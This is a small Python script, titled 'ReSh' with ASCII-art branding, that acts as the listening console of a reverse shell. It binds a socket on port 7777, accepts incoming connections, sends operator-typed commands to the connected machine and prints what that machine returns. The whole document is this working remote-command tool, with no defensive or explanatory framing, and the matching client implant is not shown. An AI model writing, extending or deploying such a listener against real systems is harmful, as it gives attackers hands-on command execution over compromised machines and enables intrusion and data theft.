import socket
import sys

resh_port = 7777
resh_max_client = 3

def socket_create():
    try:
        global host
        global port
        global resh_socket
        host = ''
        port = resh_port
        resh_socket = socket.socket()
        print("         .-\"; ! ;\"-.")
        print("       .'!  : | :  !`.")
        print("      /\  ! : ! : !  /\ ")
        print("     /\ |  ! :|: !  | /\ ")
        print("    (  \ \ \_____/ / /  )")
        print("   ( `. \ |  >_   | / .' )")
        print("   (`. \ \ \_____/ / / .')")
        print("    \ `.`.\ |!|! |/,'.' / ")
        print("      `._`.\\\!!!// .'_.'")
        print("        `.`.\\|//.'.'")
        print("  guiz   |`._`n'_.'|  ReSh")
        print("         \"----^----\"")

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def socket_bind():
    try:
        global host
        global port
        global resh_socket
        print("Binding socket to port: " + str(port))
        resh_socket.bind((host, port))
        resh_socket.listen(resh_max_client)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


def socket_accept():
    conn, address = resh_socket.accept()
    print("Connection has been established | " + "IP " + address[0] + "| Port " + str(address[1]))
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            resh_socket.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
